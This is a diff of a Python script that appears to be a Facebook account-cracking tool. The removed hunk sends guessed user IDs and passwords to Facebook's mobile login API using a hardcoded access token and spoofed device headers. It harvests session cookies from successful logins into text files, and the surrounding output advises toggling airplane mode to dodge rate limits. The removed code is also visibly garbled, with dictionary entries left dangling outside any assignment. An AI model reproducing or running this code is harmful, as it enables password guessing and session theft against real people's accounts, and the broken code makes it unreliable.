@@ -565,62 +565,6 @@ class crack_main():
                 print(' Cloning Is Started Wait For Results')
                 print(' After Every 5 Min Turn Airplane On/Off')
                 print(50*'-')													
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "device_based_login",
-"email": uid,
-"password": pw,
-"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "",
-"advertiser_id": str(uuid.uuid4()),
-"currently_logged_in_userid": "0",
-"locale": "en_GB",
-"client_country_code": "GB",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-				headers = {'User-Agent': iAmAndroidUa(),
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
-				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-				if "session_key" in q:
-					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-					cookie = f"sb={sb};{coki}"
-					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
-					ok.append(uid)
-					open('/sdcard/UMAR_M1_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/UMAR_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
-					break
-				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
-					cp.append(uid)
-					open('/sdcard/UMAR_M1_CP.txt','a').write(uid+'|'+pw+'\n')
-					break
-				else:
-					continue
-			loop+=1
-		except requests.exceptions.ConnectionError:
-				self.method1(uid,nm,pwx)
-		exit()
-if __name__=="__main__":
-	Main().menu()
-
-
 def create_file():
         os.system('clear')
         print(logo);xchker()
